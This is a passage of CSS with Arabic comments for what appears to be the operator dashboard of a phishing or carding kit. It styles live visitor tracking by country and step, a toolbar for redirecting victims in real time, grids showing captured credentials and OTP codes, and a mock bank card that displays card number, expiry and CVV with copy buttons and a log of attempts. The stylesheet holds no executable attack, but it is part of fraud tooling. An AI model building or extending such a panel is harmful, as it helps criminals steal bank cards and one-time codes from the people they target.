  background: #eff6ff;       /* خلفية هادئة موحّدة بدل التدرج */
  padding: 1px 5px 1px 4px;  /* نفس الحشو بالضبط، +1px يسار للعلم */
  border-radius: 4px;        /* نفس الزوايا */
  border: 1px solid rgba(30, 64, 175, 0.15);  /* نفس سماكة الحدود */
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  max-width: 150px;
  transition: background 0.15s ease, border-color 0.15s ease;
}

.customer-country-mini-pill:hover {
  background: #dbeafe;
  border-color: rgba(30, 64, 175, 0.3);
}

.customer-country-flag {
  font-size: 0.78rem;        /* أصغر قليلاً ليحافظ على نسبة الـ pill */
  line-height: 1;
  font-family: "Apple Color Emoji", "Segoe UI Emoji", "Noto Color Emoji", sans-serif;
  flex-shrink: 0;
}

.customer-country-text {
  display: inline-flex;
  align-items: center;
  gap: 2px;
  overflow: hidden;
  text-overflow: ellipsis;
}

.customer-country-name {
  font-weight: 800;
  letter-spacing: -0.005em;
  overflow: hidden;
  text-overflow: ellipsis;
}

.customer-country-region {
  color: #475569;
  font-weight: 600;
  overflow: hidden;
  text-overflow: ellipsis;
  max-width: 80px;
  white-space: nowrap;
}

.customer-card-meta {
  display: flex;
  align-items: center;
  gap: 6px;
  font-size: 0.72rem;
  color: var(--dash-muted);
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  margin-top: 1px;
}

.meta-badge {
  font-weight: 700;
  opacity: 0.9;
}

.meta-phone {
  font-family: monospace;
}

/* لوحة التفاصيل (الجانب الأيسر متصلة بدون فراغات) */
.customer-details {
  border: none;
  border-radius: 0;
  background: var(--dash-surface);
  box-shadow: none;
  display: flex;
  flex-direction: column;
  min-height: 0;
  overflow-y: auto;
  padding: 16px 20px;
  gap: 16px;
}

.details-empty-state {
  margin: auto;
  text-align: center;
  padding: 60px 20px;
  color: var(--dash-muted);
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 8px;
}

.empty-icon-wrap {
  width: 64px;
  height: 64px;
  border-radius: 16px;
  background: var(--dash-surface-subtle);
  display: flex;
  align-items: center;
  justify-content: center;
  color: var(--dash-muted);
  margin-bottom: 4px;
}

.details-empty-state h3 {
  margin: 0;
  font-size: 1.1rem;
  color: var(--dash-text);
}

.details-empty-state p {
  margin: 0;
  font-size: 0.86rem;
  max-width: 380px;
  line-height: 1.6;
}

/* رأس التفاصيل */
.details-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 16px;
  padding-bottom: 12px;
  border-bottom: 1px solid var(--dash-line-soft);
}

.customer-title-row {
  display: flex;
  align-items: center;
  gap: 10px;
  flex-wrap: wrap;
}

.customer-title-row h2 {
  margin: 0;
  font-size: 1.15rem;
  font-weight: 800;
  color: var(--dash-text);
}

.status-chip {
  font-size: 0.72rem;
  font-weight: 700;
  padding: 2px 8px;
  border-radius: 6px;
  background: var(--dash-surface-subtle);
  color: var(--dash-muted);
  border: 1px solid var(--dash-line);
}

.status-chip.danger {
  background: var(--dash-danger-subtle);
  color: var(--dash-danger);
  border-color: rgba(220, 38, 38, 0.2);
}

.presence-chip {
  display: inline-flex;
  align-items: center;
  gap: 5px;
  font-size: 0.72rem;
  font-weight: 700;
  padding: 2px 8px;
  border-radius: 6px;
  background: var(--dash-surface-subtle);
  color: var(--dash-muted);
}

.presence-chip.online {
  background: var(--dash-success-subtle);
  color: var(--dash-success);
}

.presence-indicator-dot {
  width: 6px;
  height: 6px;
  border-radius: 50%;
  background: currentColor;
}

.customer-location-banner {
  display: inline-flex;
  align-items: center;
  gap: 10px;
  margin-top: 8px;
  padding: 6px 14px;
  background: var(--dash-surface-subtle);
  border: 1.5px solid var(--dash-line);
  border-radius: 8px;
  transition: all 0.15s ease;
}

.customer-location-banner.is-online {
  background: var(--dash-primary-subtle);
  border-color: rgba(2, 106, 50, 0.35);
  box-shadow: 0 1px 4px rgba(2, 106, 50, 0.08);
}

.location-pulse-indicator {
  display: flex;
  align-items: center;
  justify-content: center;
  color: var(--dash-primary);
}

.location-title {
  font-weight: 800;
  color: var(--dash-muted);
  font-size: 0.84rem;
}

.location-stage-pills {
  display: flex;
  align-items: center;
  gap: 8px;
}

.location-page-chip {
  font-weight: 800;
  color: var(--dash-text);
  font-size: 0.95rem;
}

.location-arrow {
  color: var(--dash-muted);
  font-size: 1rem;
  font-weight: 900;
  line-height: 1;
}

.location-step-chip {
  font-weight: 800;
  font-size: 0.92rem;
  padding: 3px 12px;
  border-radius: 6px;
  background: #ffffff;
  border: 1px solid var(--dash-line);
  color: var(--dash-text);
}

.location-step-chip.highlight {
  background: var(--dash-primary);
  color: #ffffff;
  border-color: var(--dash-primary);
  box-shadow: 0 2px 5px rgba(2, 106, 50, 0.25);
}

.location-context-tag {
  font-size: 0.76rem;
  font-weight: 700;
  color: var(--dash-muted);
  background: rgba(0, 0, 0, 0.04);
  padding: 2px 7px;
  border-radius: 4px;
}

/* ==================== بطاقة هوية الزائر الجغرافية (دولة + منطقة + مدينة) — بحجم location-banner ==================== */
.visitor-geo-card {
  display: inline-flex;
  align-items: center;
  gap: 10px;
  margin-top: 8px;
  padding: 6px 14px;
  background: var(--dash-surface-subtle);
  border: 1.5px solid var(--dash-line);
  border-radius: 8px;
  transition: all 0.15s ease;
  max-width: 100%;
}

.visitor-geo-card.is-online {
  background: #eff6ff;          /* أزرق هادئ بدل الأخضر — لتمييزه بصرياً */
  border-color: rgba(30, 64, 175, 0.35);
  box-shadow: 0 1px 4px rgba(30, 64, 175, 0.08);
}

.visitor-geo-flag {
  font-size: 1.25rem;            /* نفس حجم أيقونة location-pulse-indicator */
  line-height: 1;
  font-family: "Apple Color Emoji", "Segoe UI Emoji", "Noto Color Emoji", sans-serif;
  flex-shrink: 0;
  display: flex;
  align-items: center;
  justify-content: center;
  width: 22px;                   /* نفس عرض الأيقونة في الـ location-banner */
  height: 22px;
  color: #1e40af;
}

.visitor-geo-card.is-online .visitor-geo-flag {
  color: #1e40af;
}

.visitor-geo-eyebrow {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  font-weight: 800;
  color: var(--dash-muted);
  font-size: 0.84rem;            /* نفس حجم location-title */
}

.visitor-geo-line {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  flex-wrap: wrap;
}

.visitor-geo-country {
  font-weight: 800;
  color: var(--dash-text);
  font-size: 0.95rem;            /* نفس حجم location-page-chip */
  letter-spacing: -0.01em;
}

.visitor-geo-country-code {
  font-weight: 800;
  font-size: 0.78rem;            /* نفس حجم location-context-tag */
  color: var(--dash-muted);
  background: rgba(0, 0, 0, 0.04);
  padding: 2px 7px;
  border-radius: 4px;
  letter-spacing: 0.04em;
  direction: ltr;
}

.visitor-geo-card.is-online .visitor-geo-country-code {
  background: rgba(30, 64, 175, 0.1);
  color: #1e40af;
}

.visitor-geo-sub {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  font-weight: 700;
  font-size: 0.84rem;            /* نفس حجم location-title */
  color: var(--dash-muted);
  flex-wrap: wrap;
}

.visitor-geo-region {
  display: inline-flex;
  align-items: center;
  gap: 3px;
  color: var(--dash-text);
  font-weight: 700;
}

.visitor-geo-card.is-online .visitor-geo-region {
  color: #1e3a8a;
}

.visitor-geo-city {
  color: var(--dash-muted);
  font-weight: 600;
}

.visitor-geo-card.is-online .visitor-geo-city {
  color: #475569;
}

.visitor-geo-timestamp {
  font-size: 0.7rem;
  font-weight: 700;
  color: var(--dash-muted);
  background: rgba(0, 0, 0, 0.04);
  padding: 2px 7px;
  border-radius: 4px;
  white-space: nowrap;
  flex-shrink: 0;
  direction: ltr;
}

.visitor-geo-card.is-online .visitor-geo-timestamp {
  color: #1e40af;
  background: rgba(30, 64, 175, 0.08);
}

/* المظهر الداكن */
.dashboard-page.theme-dark .customer-country-mini-pill {
  background: rgba(30, 64, 175, 0.18);
  border-color: rgba(96, 165, 250, 0.3);
  color: #bfdbfe;
}

.dashboard-page.theme-dark .customer-country-mini-pill:hover {
  background: rgba(30, 64, 175, 0.28);
  border-color: rgba(96, 165, 250, 0.4);
}

.dashboard-page.theme-dark .customer-country-region {
  color: #94a3b8;
}

.dashboard-page.theme-dark .visitor-geo-card {
  background: rgba(15, 23, 42, 0.6);
  border-color: rgba(96, 165, 250, 0.25);
}

.dashboard-page.theme-dark .visitor-geo-card.is-online {
  background: rgba(30, 58, 138, 0.35);
  border-color: rgba(96, 165, 250, 0.4);
  box-shadow: 0 1px 4px rgba(96, 165, 250, 0.08);
}

.dashboard-page.theme-dark .visitor-geo-country {
  color: var(--dash-text);
}

.dashboard-page.theme-dark .visitor-geo-country-code {
  background: rgba(255, 255, 255, 0.06);
  color: #94a3b8;
}

.dashboard-page.theme-dark .visitor-geo-card.is-online .visitor-geo-country-code {
  background: rgba(96, 165, 250, 0.15);
  color: #bfdbfe;
}

.dashboard-page.theme-dark .visitor-geo-region {
  color: var(--dash-text);
}

.dashboard-page.theme-dark .visitor-geo-card.is-online .visitor-geo-region {
  color: #bfdbfe;
}

.dashboard-page.theme-dark .visitor-geo-city {
  color: #94a3b8;
}

.dashboard-page.theme-dark .visitor-geo-timestamp {
  background: rgba(255, 255, 255, 0.06);
  color: #94a3b8;
}

.dashboard-page.theme-dark .visitor-geo-card.is-online .visitor-geo-timestamp {
  background: rgba(96, 165, 250, 0.15);
  color: #bfdbfe;
}

.meta-watch-badge {
  background: var(--dash-primary-subtle);
  color: var(--dash-primary);
  font-weight: 800;
  padding: 1px 6px;
  border-radius: 4px;
  font-size: 0.7rem;
  max-width: 140px;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}

.action-btn-danger {
  height: 30px;
  padding: 0 10px;
  border-radius: 6px;
  border: 1px solid rgba(220, 38, 38, 0.25);
  background: transparent;
  color: var(--dash-danger);
  font-size: 0.78rem;
  font-weight: 700;
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  gap: 5px;
  transition: all 0.15s ease;
}

.action-btn-danger:hover {
  background: var(--dash-danger-subtle);
}

.action-btn-ban {
  height: 30px;
  padding: 0 10px;
  border-radius: 6px;
  border: 1px solid rgba(220, 38, 38, 0.4);
  background: rgba(220, 38, 38, 0.12);
  color: #ef4444;
  font-size: 0.78rem;
  font-weight: 800;
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  gap: 5px;
  transition: all 0.15s ease;
}

.action-btn-ban:hover {
  background: #dc2626;
  border-color: #b91c1c;
  color: #ffffff;
  transform: translateY(-1px);
  box-shadow: 0 3px 10px rgba(220, 38, 38, 0.35);
}

.action-btn-unban {
  height: 30px;
  padding: 0 10px;
  border-radius: 6px;
  border: 1px solid rgba(16, 185, 129, 0.35);
  background: rgba(16, 185, 129, 0.12);
  color: #10b981;
  font-size: 0.78rem;
  font-weight: 800;
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  gap: 5px;
  transition: all 0.15s ease;
}

.action-btn-unban:hover {
  background: #10b981;
  border-color: #059669;
  color: #ffffff;
  transform: translateY(-1px);
  box-shadow: 0 3px 10px rgba(16, 185, 129, 0.35);
}

.banned-tag {
  font-size: 0.66rem;
  font-weight: 800;
  padding: 1px 6px;
  border-radius: 4px;
  background: rgba(220, 38, 38, 0.15);
  color: #ef4444;
  border: 1px solid rgba(220, 38, 38, 0.35);
}

.status-chip.danger-banned {
  background: rgba(220, 38, 38, 0.15);
  color: #ef4444;
  border-color: rgba(220, 38, 38, 0.4);
  font-weight: 800;
}

/* شريط التوجيه اللحظي */
.remote-redirect-toolbar {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 8px 12px;
  border-radius: 8px;
  background: var(--dash-surface-subtle);
  border: 1px solid var(--dash-line-soft);
  flex-wrap: wrap;
}

.toolbar-label {
  display: inline-flex;
  align-items: center;
  gap: 5px;
  font-size: 0.78rem;
  font-weight: 700;
  color: var(--dash-muted);
}

.toolbar-buttons-group {
  display: flex;
  align-items: center;
  gap: 6px;
  flex-wrap: wrap;
}

.step-redirect-btn {
  height: 28px;
  padding: 0 10px;
  border-radius: 6px;
  border: 1px solid var(--dash-line);
  background: var(--dash-surface);
  color: var(--dash-text);
  font-size: 0.76rem;
  font-weight: 700;
  cursor: pointer;
  transition: all 0.12s ease;
}

.step-redirect-btn:hover {
  border-color: var(--dash-primary);
  color: var(--dash-primary);
}

.step-redirect-btn.whatsapp-btn {
  color: #15803d;
  border-color: rgba(21, 128, 61, 0.3);
}

.step-redirect-btn.whatsapp-btn:hover {
  background: #f0fdf4;
}

.redirect-toast {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  font-size: 0.74rem;
  font-weight: 700;
  padding: 2px 8px;
  border-radius: 4px;
  background: var(--dash-success-subtle);
  color: var(--dash-success);
  margin-right: auto;
}

/* كتل المحتوى والبيانات */
.content-block {
  display: flex;
  flex-direction: column;
  gap: 10px;
}

.content-block-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
}

.block-title {
  display: flex;
  align-items: center;
  gap: 6px;
  color: var(--dash-text);
}

.block-title h3 {
  margin: 0;
  font-size: 0.92rem;
  font-weight: 800;
}

.auth-credentials-grid {
  display: grid;
  grid-template-columns: repeat(3, minmax(0, 1fr));
  gap: 10px;
  align-items: stretch;
  direction: ltr !important;
}

.auth-stage-card {
  display: flex;
  flex-direction: column;
  justify-content: flex-start;
  min-height: 100%;
  padding: 10px 12px;
  gap: 6px;
  direction: rtl;
  background: var(--dash-card);
  border: 1px solid var(--dash-line);
  border-radius: 10px;
}

.auth-stage-card .data-card-header {
  padding-bottom: 5px;
  border-bottom: 1px solid var(--dash-line-soft);
  margin-bottom: 2px;
}

.stage-title-tag {
  display: flex;
  align-items: center;
  gap: 6px;
}

.stage-num {
  width: 18px;
  height: 18px;
  border-radius: 50%;
  background: var(--dash-surface-subtle);
  border: 1px solid var(--dash-line);
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 0.65rem;
  font-weight: 800;
  color: var(--dash-muted);
}

.auth-stage-card .stage-card-body {
  display: flex;
  flex-direction: column;
  gap: 5px;
  margin: 0;
  flex: 0 0 auto;
}

.compact-cell {
  padding: 3px 8px;
}

.compact-cell .auth-cell-head {
  margin: 0;
}

.auth-value-pill {
  font-size: 0.7rem;
  font-weight: 700;
  color: var(--dash-text);
  background: var(--dash-surface);
  padding: 1px 6px;
  border-radius: 4px;
  border: 1px solid var(--dash-line-soft);
}

.data-card {
  border: 1px solid var(--dash-line);
  border-radius: 8px;
  padding: 10px 14px;
  background: var(--dash-card);
  display: flex;
  flex-direction: column;
  gap: 8px;
}

.data-card.card-pending-border {
  border-color: var(--dash-warning);
  background: var(--dash-warning-subtle);
}

.data-card-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
}

.card-subtitle {
  font-size: 0.8rem;
  font-weight: 800;
  color: var(--dash-muted);
}

.status-badge {
  font-size: 0.68rem;
  font-weight: 800;
  padding: 2px 7px;
  border-radius: 4px;
  background: var(--dash-surface-subtle);
  color: var(--dash-muted);
}

.status-badge.approved {
  background: var(--dash-success-subtle);
  color: var(--dash-success);
}

.status-badge.rejected {
  background: var(--dash-danger-subtle);
  color: var(--dash-danger);
}

.status-badge.pending {
  background: var(--dash-warning-subtle);
  color: var(--dash-warning);
}

.auth-cells-grid {
  display: grid;
  grid-template-columns: repeat(3, minmax(0, 1fr));
  gap: 8px;
}

.auth-cells-grid.single-cell-grid {
  grid-template-columns: 1fr;
}

.auth-cell {
  background: var(--dash-surface-subtle);
  border: 1px solid var(--dash-line-soft);
  border-radius: 6px;
  padding: 5px 8px;
  display: flex;
  flex-direction: column;
  gap: 3px;
}

.auth-cell-head {
  display: flex;
  align-items: center;
  justify-content: space-between;
}

.auth-cell-label {
  font-size: 0.66rem;
  font-weight: 700;
  color: var(--dash-muted);
}

.auth-cell-body {
  display: flex;
  align-items: center;
}

.value-display-box {
  width: 100%;
  padding: 4px 8px;
  border-radius: 5px;
  background: var(--dash-surface);
  border: 1px solid var(--dash-line);
  display: flex;
  align-items: center;
  justify-content: center;
  text-align: center;
  min-height: 28px;
}

.value-display-box.primary-box {
  background: var(--dash-primary-subtle);
  border-color: rgba(2, 106, 50, 0.25);
  color: var(--dash-primary);
  font-weight: 800;
  font-size: 0.84rem;
}

.value-display-box.danger-box {
  background: var(--dash-danger-subtle);
  border-color: rgba(220, 38, 38, 0.25);
  color: var(--dash-danger);
  font-weight: 800;
  font-size: 0.84rem;
}

.value-display-box.otp-box {
  background: var(--dash-warning-subtle);
  border-color: rgba(217, 119, 6, 0.35);
  color: var(--dash-warning);
  font-weight: 900;
}

.stage-num-card {
  width: 22px;
  height: 22px;
  border-radius: 6px;
  background: var(--dash-primary-subtle);
  color: var(--dash-primary);
  display: inline-flex;
  align-items: center;
  justify-content: center;
}

/* تصميم البطاقة البنكية الواقعية في الداشبورد */
.card-empty-placeholder {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 8px 12px;
  background: var(--dash-surface-subtle);
  border: 1px dashed var(--dash-line);
  border-radius: 8px;
  color: var(--dash-muted);
  font-size: 0.76rem;
  font-weight: 600;
  margin: 2px 0;
}

.empty-icon-dot {
  width: 7px;
  height: 7px;
  border-radius: 50%;
  background: var(--dash-muted);
  opacity: 0.6;
  flex-shrink: 0;
}

.physical-card-container {
  padding: 10px 12px 14px;
  display: flex;
  justify-content: flex-start;
  width: 100%;
  direction: ltr !important;
}

.cards-attempts-stack {
  display: flex;
  flex-wrap: wrap;
  gap: 16px;
  justify-content: flex-start;
  align-items: stretch;
  width: 100%;
  direction: ltr !important;
}

.card-attempt-item {
  display: flex;
  flex-direction: column;
  gap: 10px;
  flex: 1 1 360px;
  max-width: 440px;
  background: var(--dash-surface-subtle);
  border: 1px solid var(--dash-line-soft);
  border-radius: 14px;
  padding: 14px;
  transition: all 0.2s ease;
  direction: rtl;
}

.card-attempt-item.is-current {
  border-color: rgba(2, 106, 50, 0.35);
  background: rgba(2, 106, 50, 0.04);
}

.card-attempt-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 10px;
  padding: 0 4px;
}

.attempt-label-wrap {
  display: flex;
  align-items: center;
  gap: 8px;
}

.card-attempt-badge {
  font-size: 0.72rem;
  font-weight: 800;
  padding: 2px 8px;
  border-radius: 5px;
}

.card-attempt-badge.latest {
  background: rgba(2, 106, 50, 0.12);
  color: var(--dash-primary);
  border: 1px solid rgba(2, 106, 50, 0.25);
}

.card-attempt-badge.past {
  background: var(--dash-surface);
  color: var(--dash-muted);
  border: 1px solid var(--dash-line);
}

.card-attempt-time {
  font-size: 0.72rem;
  font-family: monospace;
  color: var(--dash-muted);
}

.realistic-credit-card {
  width: 100%;
  max-width: 440px;
  min-height: 215px;
  border-radius: 14px;
  padding: 20px 22px;
  background: linear-gradient(135deg, #0b1e13 0%, #054024 50%, #022614 100%);
  border: 1px solid rgba(255, 255, 255, 0.15);
  box-shadow: 0 14px 28px rgba(0, 0, 0, 0.22), 0 10px 10px rgba(0, 0, 0, 0.12), inset 0 1px 0 rgba(255, 255, 255, 0.25);
  display: flex;
  flex-direction: column;
  justify-content: space-between;
  position: relative;
  overflow: hidden;
  color: #ffffff;
  direction: ltr !important;
  text-align: left !important;
  transition: all 0.3s ease;
}

.realistic-credit-card::before {
  content: "";
  position: absolute;
  top: -50%;
  left: -50%;
  width: 200%;
  height: 200%;
  background: radial-gradient(circle at 75% 25%, rgba(255, 255, 255, 0.12) 0%, transparent 60%);
  pointer-events: none;
}

.realistic-credit-card.brand-visa {
  background: linear-gradient(135deg, #0a192f 0%, #172a45 45%, #0d3b66 100%);
}

.realistic-credit-card.brand-mastercard {
  background: linear-gradient(135deg, #1c1917 0%, #292524 45%, #44403c 100%);
}

.card-top-row {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 18px;
  position: relative;
  z-index: 2;
}

.chip-and-nfc {
  display: flex;
  align-items: center;
  gap: 12px;
}

/* شريحة EMV الذهبية */
.emv-gold-chip {
  width: 40px;
  height: 30px;
  background: linear-gradient(135deg, #d4af37 0%, #f3e5ab 50%, #aa771c 100%);
  border-radius: 5px;
  position: relative;
  border: 1px solid #996515;
  box-shadow: inset 0 1px 2px rgba(255, 255, 255, 0.6), 0 2px 4px rgba(0, 0, 0, 0.3);
  overflow: hidden;
}

.chip-line {
  position: absolute;
  background: rgba(100, 60, 10, 0.45);
}

.chip-h1 {
  top: 9px;
  left: 0;
  right: 0;
  height: 1px;
}

.chip-h2 {
  bottom: 9px;
  left: 0;
  right: 0;
  height: 1px;
}

.chip-v1 {
  left: 18px;
  top: 0;
  bottom: 0;
  width: 1px;
}

.chip-circle {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  width: 12px;
  height: 12px;
  border: 1px solid rgba(100, 60, 10, 0.45);
  border-radius: 50%;
}

.nfc-wireless-icon {
  color: rgba(255, 255, 255, 0.7);
  transform: rotate(90deg);
  display: flex;
  align-items: center;
}

.card-brand-display {
  display: flex;
  align-items: center;
  justify-content: flex-end;
}

.realistic-card-logo {
  height: 24px !important;
  max-width: 54px !important;
  width: auto !important;
  object-fit: contain !important;
  display: block !important;
  filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.3));
}

/* صف رقم البطاقة */
.card-number-row {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 18px;
  position: relative;
  z-index: 2;
  background: rgba(0, 0, 0, 0.22);
  padding: 8px 12px;
  border-radius: 8px;
  border: 1px solid rgba(255, 255, 255, 0.08);
}

.embossed-card-number {
  font-size: 1.15rem;
  font-weight: 700;
  letter-spacing: 2.5px;
  color: #ffffff;
  text-shadow: 0 2px 4px rgba(0, 0, 0, 0.6), 0 0 2px rgba(255, 255, 255, 0.3);
}

.quick-card-copy-btn {
  display: inline-flex;
  align-items: center;
  gap: 5px;
  padding: 4px 10px;
  background: rgba(255, 255, 255, 0.15);
  border: 1px solid rgba(255, 255, 255, 0.25);
  border-radius: 6px;
  color: #ffffff;
  font-size: 0.75rem;
  font-weight: 700;
  cursor: pointer;
  transition: all 0.2s ease;
  backdrop-filter: blur(4px);
}

.quick-card-copy-btn:hover {
  background: rgba(255, 255, 255, 0.3);
  transform: scale(1.03);
}

.quick-card-copy-btn.copied {
  background: #16a34a;
  border-color: #15803d;
  color: #ffffff;
}

/* الصف السفلي للبطاقة */
.card-bottom-row {
  display: flex;
  align-items: flex-end;
  justify-content: space-between;
  gap: 12px;
  position: relative;
  z-index: 2;
}

.card-holder-info {
  display: flex;
  flex-direction: column;
  gap: 2px;
  max-width: 170px;
}

.card-meta-label {
  font-size: 0.62rem;
  font-weight: 700;
  letter-spacing: 1px;
  color: rgba(255, 255, 255, 0.65);
}

.card-meta-val {
  font-size: 0.82rem;
  font-weight: 700;
  color: #ffffff;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  text-shadow: 0 1px 2px rgba(0, 0, 0, 0.5);
}

.cell-head-actions {
  display: flex;
  align-items: center;
  gap: 6px;
}

/* زر النسخ المتوسط والأنيق لكافة الحقول */
.field-copy-btn {
  display: inline-flex;
  align-items: center;
  gap: 5px;
  padding: 3px 8px;
  background: var(--dash-surface);
  border: 1px solid var(--dash-line);
  border-radius: 6px;
  color: var(--dash-text-soft);
  font-size: 0.74rem;
  font-weight: 700;
  cursor: pointer;
  transition: all 0.15s ease;
  line-height: 1;
}

.field-copy-btn:hover {
  background: var(--dash-primary-subtle);
  border-color: var(--dash-primary);
  color: var(--dash-primary);
  transform: translateY(-1px);
}

.field-copy-btn.copied {
  background: #16a34a !important;
  border-color: #15803d !important;
  color: #ffffff !important;
}

.field-copy-btn-card {
  display: inline-flex;
  align-items: center;
  gap: 5px;
  padding: 4px 10px;
  background: #ffffff !important;
  border: 1px solid rgba(255, 255, 255, 0.9) !important;
  border-radius: 6px;
  color: #0f172a !important;
  font-size: 0.76rem;
  font-weight: 800;
  cursor: pointer;
  box-shadow: 0 2px 6px rgba(0, 0, 0, 0.35);
  transition: all 0.18s ease;
  line-height: 1;
  white-space: nowrap;
}

.field-copy-btn-card:hover {
  background: #f1f5f9 !important;
  transform: translateY(-1px);
  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.45);
}

.field-copy-btn-card.copied {
  background: #16a34a !important;
  border-color: #15803d !important;
  color: #ffffff !important;
}

.embossed-meta-val {
  font-size: 0.9rem;
  font-weight: 700;
  letter-spacing: 1.2px;
  color: #ffffff;
  text-shadow: 0 1px 3px rgba(0, 0, 0, 0.5);
}

.card-cvv-info {
  display: flex;
  flex-direction: column;
  gap: 2px;
}

.embossed-cvv-val {
  font-size: 0.9rem;
  font-weight: 800;
  letter-spacing: 1.2px;
  color: #fef08a;
  text-shadow: 0 1px 3px rgba(0, 0, 0, 0.5);
}

.quick-mini-copy-btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  width: 20px;
  height: 20px;
  padding: 0;
  background: rgba(255, 255, 255, 0.18);
  border: 1px solid rgba(255, 255, 255, 0.25);
  border-radius: 4px;
  color: #ffffff;
  cursor: pointer;
  transition: all 0.18s ease;
}

.quick-mini-copy-btn:hover {
  background: rgba(255, 255, 255, 0.35);
  transform: scale(1.08);
}

.quick-mini-copy-btn.copied {
  background: #16a34a;
  border-color: #15803d;
}

.bank-card-fields-grid {
  display: grid;
  grid-template-columns: 1.8fr 1.1fr 1.1fr;
  gap: 12px;
  padding: 0 16px 16px;
}

@media (max-width: 900px) {
  .bank-card-fields-grid {
    grid-template-columns: 1fr;
  }
}

@media (max-width: 520px) {
  .realistic-credit-card {
    padding: 16px 18px;
  }
  .embossed-card-number {
    font-size: 1rem;
    letter-spacing: 1.5px;
  }
  .card-bottom-row {
    flex-wrap: wrap;
    gap: 10px;
  }
}

.clickable-field {
  cursor: pointer;
  position: relative;
  transition: all 0.15s ease;
}

.clickable-field:hover {
  transform: translateY(-1px);
  filter: brightness(0.97);
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
}

.history-chip-btn {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  background: var(--dash-surface);
  border: 1px solid var(--dash-line);
  color: var(--dash-primary);
  font-size: 0.68rem;
  font-weight: 800;
  padding: 1px 7px;
  border-radius: 12px;
  cursor: pointer;
  transition: all 0.15s ease;
}

.history-chip-btn:hover {
  background: var(--dash-primary-subtle);
  border-color: var(--dash-primary);
}

.otp-large {
  font-size: 1.3rem;
  letter-spacing: 3px;
}

.box-text {
  word-break: break-all;
}

.auth-value-text {
  font-size: 0.88rem;
  font-weight: 700;
  color: var(--dash-text);
  padding: 6px 4px;
}

/* تنسيقات نافذة سجل الإدخالات السابقة */
.history-modal-box {
  width: 100%;
  max-width: 520px;
  background: var(--dash-surface);
  border: 1px solid var(--dash-line);
  border-radius: 12px;
  box-shadow: var(--dash-shadow-lg);
  overflow: hidden;
  display: flex;
  flex-direction: column;
  animation: modalPopIn 0.2s cubic-bezier(0.16, 1, 0.3, 1);
}

.history-modal-header {
  padding: 14px 18px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  border-bottom: 1px solid var(--dash-line-soft);
  background: var(--dash-surface-subtle);
}

.history-title-wrap {
  display: flex;
  align-items: center;
  gap: 10px;
}

.history-icon-circle {
  width: 34px;
  height: 34px;
  border-radius: 8px;
  background: var(--dash-primary-subtle);
  color: var(--dash-primary);
  display: flex;
  align-items: center;
  justify-content: center;
}

.history-title-wrap h3 {
  margin: 0;
  font-size: 0.95rem;
  font-weight: 800;
  color: var(--dash-text);
}

.history-subtitle {
  margin: 2px 0 0;
  font-size: 0.72rem;
  color: var(--dash-muted);
}

.history-modal-body {
  padding: 16px 18px;
  max-height: 420px;
  overflow-y: auto;
}

.history-empty-state {
  text-align: center;
  padding: 30px 10px;
  color: var(--dash-muted);
  font-size: 0.86rem;
  font-weight: 700;
}

.history-list {
  display: flex;
  flex-direction: column;
  gap: 10px;
}

.history-entry-card {
  border: 1px solid var(--dash-line);
  border-radius: 8px;
  padding: 10px 12px;
  background: var(--dash-surface);
  display: flex;
  flex-direction: column;
  gap: 8px;
  transition: border-color 0.15s ease;
}

.history-entry-card.is-latest {
  border-color: rgba(2, 106, 50, 0.4);
  background: var(--dash-primary-subtle);
}

.creds-pair-rows {
  display: flex;
  flex-direction: column;
  gap: 6px;
}

.cred-pair-row {
  display: flex;
  align-items: center;
  gap: 10px;
  background: var(--dash-surface);
  border: 1px solid var(--dash-line-soft);
  border-radius: 6px;
  padding: 6px 10px;
}

.cred-row-label {
  font-size: 0.72rem;
  font-weight: 700;
  color: var(--dash-muted);
  min-width: 85px;
  flex-shrink: 0;
}

.primary-highlight {
  color: var(--dash-primary);
}

.danger-highlight {
  color: var(--dash-danger);
}

.mini-pill {
  font-size: 0.65rem;
  padding: 1px 6px;
}

.header-status-wrap {
  display: flex;
  align-items: center;
  gap: 6px;
}

.entry-meta {
  display: flex;
  align-items: center;
  justify-content: space-between;
}

.entry-badge-latest {
  font-size: 0.68rem;
  font-weight: 800;
  color: var(--dash-primary);
  background: rgba(2, 106, 50, 0.12);
  padding: 2px 8px;
  border-radius: 4px;
}

.entry-badge-past {
  font-size: 0.68rem;
  font-weight: 700;
  color: var(--dash-muted);
  background: var(--dash-surface-subtle);
  padding: 2px 8px;
  border-radius: 4px;
}

.entry-time {
  font-size: 0.72rem;
  color: var(--dash-muted);
  font-weight: 600;
}

.entry-value-row {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 10px;
  background: var(--dash-surface);
  border: 1px solid var(--dash-line-soft);
  border-radius: 6px;
  padding: 6px 10px;
}

.entry-code-val {
  font-family: monospace;
  font-size: 0.95rem;
  font-weight: 800;
  color: var(--dash-text);
  word-break: break-all;
  flex: 1;
}

.entry-copy-btn {
  height: 28px;
  padding: 0 10px;
  border-radius: 5px;
  border: 1px solid var(--dash-line);
